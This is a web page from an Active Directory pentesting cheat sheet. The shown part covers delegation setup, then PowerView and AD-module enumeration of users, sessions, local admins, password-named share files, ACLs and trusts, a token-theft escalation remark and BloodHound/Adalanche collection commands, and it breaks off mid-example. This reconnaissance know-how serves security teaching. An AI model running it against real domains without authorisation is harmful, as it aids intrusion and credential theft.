<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Basic knowledge - readloud.org</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Basic Knowledge", url: "#_top", children: [
              {title: "User Management", url: "#user-management" },
          ]},
          {title: "Active Directory Exploitation Cheat Sheet", url: "#active-directory-exploitation-cheat-sheet", children: [
              {title: "Domain Enumeration", url: "#domain-enumeration" },
              {title: "Local Privilege Escalation", url: "#local-privilege-escalation" },
              {title: "Lateral Movement", url: "#lateral-movement" },
              {title: "Domain Privilege Escalation", url: "#domain-privilege-escalation" },
              {title: "DNSAdmins Abuse", url: "#dnsadmins-abuse" },
              {title: "SID History Abuse", url: "#sid-history-abuse" },
              {title: "Exploiting SharePoint", url: "#exploiting-sharepoint" },
              {title: "Cross Forest Attacks", url: "#cross-forest-attacks" },
          ]},
          {title: "Active Directory Pentesting", url: "#active-directory-pentesting", children: [
              {title: "Enumeration", url: "#enumeration" },
              {title: "Enumeration with BloodHound", url: "#enumeration-with-bloodhound" },
              {title: "Investigation", url: "#investigation" },
              {title: "Force Change Password Attack", url: "#force-change-password-attack" },
              {title: "Microsoft Management Console (mmc)", url: "#microsoft-management-console-mmc" },
              {title: "Naming Convention", url: "#naming-convention" },
              {title: "SSH Login with AD Credentials", url: "#ssh-login-with-ad-credentials" },
              {title: "Inject Credentials into Memory", url: "#inject-credentials-into-memory" },
              {title: "DNS Configuration", url: "#dns-configuration" },
              {title: "Intercept NetNTLM Authentication", url: "#intercept-netntlm-authentication" },
          ]},
          {title: "Active Directory Auditing", url: "#active-directory-auditing", children: [
              {title: "Case #1: Domain accounts hashes are extracted offline from NTDS.dit", url: "#case-1-domain-accounts-hashes-are-extracted-offline-from-ntdsdit" },
              {title: "Case #2: Bitlocker information dump", url: "#case-2-bitlocker-information-dump" },
              {title: "Case #3: Local account and cached domain credentials", url: "#case-3-local-account-and-cached-domain-credentials" },
          ]},
          {title: "AD CS (Active Directory Certificate Services) Pentesting", url: "#ad-cs-active-directory-certificate-services-pentesting", children: [
              {title: "Enumeration", url: "#enumeration_1" },
          ]},
          {title: "AS-REP Roasting", url: "#as-rep-roasting", children: [
              {title: "Exploit", url: "#exploit" },
          ]},
          {title: "Constrained Delegation Attack", url: "#constrained-delegation-attack", children: [
              {title: "Investigation", url: "#investigation_1" },
              {title: "Exploit", url: "#exploit_1" },
          ]},
          {title: "DACL (Discretionary Access Control List) Attack", url: "#dacl-discretionary-access-control-list-attack", children: [
              {title: "Add Rights", url: "#add-rights" },
          ]},
          {title: "Download Files in Windows", url: "#download-files-in-windows", children: [
              {title: "Using Invoke-WebRequest", url: "#using-invoke-webrequest" },
          ]},
          {title: "Kerberoasting Attack", url: "#kerberoasting-attack", children: [
              {title: "Attack", url: "#attack" },
          ]},
          {title: "Kerberos Pentesting", url: "#kerberos-pentesting", children: [
              {title: "Enumeration", url: "#enumeration_2" },
              {title: "AS-REP Roasting", url: "#as-rep-roasting_1" },
              {title: "Kerberoasting Attack", url: "#kerberoasting-attack_1" },
          ]},
          {title: "LAPS (Local Administrator Password Solution) Pentesting", url: "#laps-local-administrator-password-solution-pentesting", children: [
              {title: "Enumeration", url: "#enumeration_3" },
              {title: "Obtain Administrator\u0027s Password", url: "#obtain-administrators-password" },
          ]},
          {title: "LDAP Injection", url: "#ldap-injection", children: [
              {title: "Basic Payloads", url: "#basic-payloads" },
          ]},
          {title: "LDAP (Lightweight Directory Access Protocol) Pentesting", url: "#ldap-lightweight-directory-access-protocol-pentesting", children: [
              {title: "Enumeration", url: "#enumeration_4" },
              {title: "Search LDAP", url: "#search-ldap" },
              {title: "Dump Active Directory Information", url: "#dump-active-directory-information" },
              {title: "Connect", url: "#connect" },
              {title: "Pass-Back Attack", url: "#pass-back-attack" },
          ]},
          {title: "Netlogon Elavasion of Privilege", url: "#netlogon-elavasion-of-privilege", children: [
              {title: "Exploitation", url: "#exploitation" },
          ]},
          {title: "Resource-Based Constrained Delegation Attack", url: "#resource-based-constrained-delegation-attack", children: [
              {title: "Exploit", url: "#exploit_2" },
          ]},
          {title: "Shadow Credentials", url: "#shadow-credentials", children: [
              {title: "Exploit", url: "#exploit_3" },
          ]},
          {title: "SMB (Server Message Block) Pentesting", url: "#smb-server-message-block-pentesting", children: [
              {title: "Enumeration", url: "#enumeration_5" },
              {title: "RID Cycling Attack", url: "#rid-cycling-attack" },
              {title: "Password Spraying Attack", url: "#password-spraying-attack" },
              {title: "NTLM Stealing", url: "#ntlm-stealing" },
              {title: "Connect", url: "#connect_1" },
              {title: "Commands in SMB", url: "#commands-in-smb" },
              {title: "EternalBlue (MS17-010)", url: "#eternalblue-ms17-010" },
              {title: "Launch SMB Server", url: "#launch-smb-server" },
          ]},
          {title: "403 bypass:", url: "#403-bypass", children: [
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h2 id="basic-knowledge">Basic Knowledge</h2>
<p>This cheat sheet contains common enumeration and attack methods for Windows Active Directory.</p>
<p>This cheat sheet is inspired by the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> repo.</p>
<p><img alt="Just Walking The Dog" src="/images/WalkTheDog.png" /></p>
<h3 id="user-management">User Management</h3>
<ul>
<li>
<p><strong>Delegation</strong></p>
<p>In Active Directory, the administrator delegate another user to manage users over an Organizational Unit (OU),  without the admin privileges.</p>
<ol>
<li>
<p>Setup</p>
<ol>
<li>Open "Active Directory Users and Computers".</li>
<li>Right-click on the target OU, and click “Deligate Control…”. Then the new window will open.</li>
<li>In the window, input username who you want to delegate the privilege that manage users.</li>
<li>Select tasks to which the delegated user should manage.</li>
<li>Click OK.</li>
</ol>
</li>
<li>
<p>Manage Users</p>
<ol>
<li>Logon as the delegated user.</li>
<li>For instance, if you want to reset the john's password, execute the following command in PowerShell. Then input new password in prompt.</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>    Set-ADAccountPassword john -Reset -NewPassword (Read-Host -AsSecureString -Prompt &#39;New Password&#39;) -Verbose
</span></code></pre></div>
<ol>
<li>The first time John logs on after that, we want John to change his arbitrary password not the password you entered. So that to, execute the following command.</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>    Set-ADUser -ChangePasswordAtLogon $true -Identity john -Verbose
</span></code></pre></div>
<ol>
<li>Now when John logs on he will be prompt to change a new password.</li>
</ol>
</li>
</ol>
</li>
</ul>
<p><br /></p>
<h1 id="active-directory-exploitation-cheat-sheet">Active Directory Exploitation Cheat Sheet</h1>
<h2 id="domain-enumeration">Domain Enumeration</h2>
<ul>
<li>
<p>Using PowerView</p>
</li>
<li>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview v.3.0</a><br></p>
</li>
<li>
<p><a href="https://powersploit.readthedocs.io/en/latest/">Powerview Wiki</a></p>
</li>
<li>
<p><strong>Get Current Domain:</strong> <code>Get-Domain</code></p>
</li>
<li><strong>Enumerate Other Domains:</strong> <code>Get-Domain -Domain &lt;DomainName&gt;</code></li>
<li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li>
<li><strong>Get Domain Policy:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>  Get-DomainPolicy
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>  #Will show us the policy configurations of the Domain about system access or kerberos
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
</span></code></pre></div>
<ul>
<li><strong>Get Domain Controllers:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>  Get-DomainController
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>  Get-DomainController -Domain &lt;DomainName&gt;
</span></code></pre></div></li>
<li><strong>Enumerate Domain Users:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>  #Save all Domain Users to a file
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>  #Will return specific properties of a specific user
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>  #Enumerate user logged on a machine
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>  Get-NetLoggedon -ComputerName &lt;ComputerName&gt;
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>  #Enumerate Session Information for a machine
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>  Get-NetSession -ComputerName &lt;ComputerName&gt;
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>  #Enumerate domain machines of the current/specified domain where specific users are logged into
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>  Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName
</span></code></pre></div>
<ul>
<li><strong>Enum Domain Computers:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>  #Enumerate Live machines
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
</span></code></pre></div>
<ul>
<li><strong>Enum Groups and Group Members:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>  #Save all Domain Groups to a file:
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>  #Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>  Get-DomainGroup -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object -ExpandProperty Member
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>  Get-DomainGroupMember -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object MemberDistinguishedName
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>  Get-NetLocalGroup | Select-Object GroupName
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
</span></code></pre></div>
<ul>
<li><strong>Enumerate Shares:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>  #Enumerate Domain Shares
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  Find-DomainShare
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>  #Enumerate Domain Shares the current user has access
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>  Find-DomainShare -CheckShareAccess
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>  #Enumerate &quot;Interesting&quot; Files on accessible shares
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>  Find-InterestingDomainShareFile -Include *passwords*
</span></code></pre></div>
<ul>
<li><strong>Enum Group Policies:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>  #Enumerate all GPOs to a specific computer
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>  Get-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>  #Get users that are part of a Machine&#39;s local Admin group
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>  Get-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;
</span></code></pre></div>
<ul>
<li><strong>Enum OUs:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>  Get-DomainOU -Properties Name | Sort-Object -Property Name
</span></code></pre></div></li>
<li><strong>Enum ACLs:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>  # Returns the ACLs associated with the specified account
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>  Get-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>  #Search for interesting ACEs
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>  Find-InterestingDomainAcl -ResolveGUIDs
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>  #Check the ACLs associated with a specified path (e.g smb share)
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>  Get-PathAcl -Path &quot;\\Path\Of\A\Share&quot;
</span></code></pre></div>
<ul>
<li><strong>Enum Domain Trust:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>  Get-DomainTrust
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>  Get-DomainTrust -Domain &lt;DomainName&gt;
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>  Get-DomainTrustMapping
</span></code></pre></div>
<ul>
<li><strong>Enum Forest Trust:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>  Get-ForestDomain
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  Get-ForestDomain -Forest &lt;ForestName&gt;
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>  #Map the Trust of the Forest
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>  Get-ForestTrust
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>  Get-ForestTrust -Forest &lt;ForestName&gt;
</span></code></pre></div>
<ul>
<li><strong>User Hunting:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>  #Finds all machines on the current domain where the current user has local admin access
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  Find-LocalAdminAccess -Verbose
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>  #Find local admins on all machines of the domain
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>  Find-DomainLocalGroupMember -Verbose
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>  #Find computers were a Domain Admin OR a spesified user has a session
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>  Find-DomainUserLocation | Select-Object UserName, SessionFromName
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>  #Confirming admin access
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>  Test-AdminAccess
</span></code></pre></div>
<p>:heavy_exclamation_mark: <strong>Priv Esc to Domain Admin with User Hunting:</strong> \
  I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt; Profit!</p>
<ul>
<li>
<p>Using AD Module</p>
</li>
<li>
<p><strong>Get Current Domain:</strong> <code>Get-ADDomain</code></p>
</li>
<li><strong>Enum Other Domains:</strong> <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li>
<li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li>
<li><strong>Get Domain Controlers:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>  Get-ADDomainController
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>  Get-ADDomainController -Identity &lt;DomainName&gt;
</span></code></pre></div>
<ul>
<li><strong>Enumerate Domain Users:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>  Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>  #Get a spesific &quot;string&quot; on a user&#39;s attribute
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>  Get-ADUser -Filter &#39;Description -like &quot;*wtver*&quot;&#39; -Properties Description | select Name, Description
</span></code></pre></div>
<ul>
<li><strong>Enum Domain Computers:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>  Get-ADComputer -Filter * -Properties *
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>  Get-ADGroup -Filter *
</span></code></pre></div></li>
<li><strong>Enum Domain Trust:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>  Get-ADTrust -Filter *
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>  Get-ADTrust -Identity &lt;DomainName&gt;
</span></code></pre></div></li>
<li><strong>Enum Forest Trust:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>  Get-ADForest
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>  Get-ADForest -Identity &lt;ForestName&gt;
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>  #Domains of Forest Enumeration
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>  (Get-ADForest).Domains
</span></code></pre></div>
<ul>
<li><strong>Enum Local AppLocker Effective Policy:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</span></code></pre></div>
<ul>
<li>
<p>Using BloodHound</p>
</li>
<li>
<p>Remote BloodHound</p>
</li>
</ul>
<p><a href="https://github.com/fox-it/BloodHound.py">Python BloodHound Repository</a> or install it with <code>pip3 install bloodhound</code></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>bloodhound-python -u &lt;UserName&gt; -p &lt;Password&gt; -ns &lt;Domain Controller&#39;s Ip&gt; -d &lt;Domain&gt; -c All
</span></code></pre></div>
<ul>
<li>On Site BloodHound</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>#Using exe ingestor
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>.\SharpHound.exe --CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domain &lt;Domain&gt; --domaincontroller &lt;Domain Controller&#39;s Ip&gt; --OutputDirectory &lt;PathToFile&gt;
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>#Using PowerShell module ingestor
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>. .\SharpHound.ps1
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>Invoke-BloodHound -CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --OutputDirectory &lt;PathToFile&gt;
</span></code></pre></div>
<ul>
<li>
<p>Using Adalanche</p>
</li>
<li>
<p>Remote Adalanche</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a># kali linux:
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>./adalanche collect activedirectory --domain &lt;Domain&gt; \
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>--username &lt;Username@Domain&gt; --password &lt;Password&gt; \
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>--server &lt;DC&gt;
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a># Example:
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>./adalanche collect activedirectory --domain windcorp.local \
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>--username spoNge369@windcorp.local --password &#39;password123!&#39; \
</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>--server dc.windcorp.htb
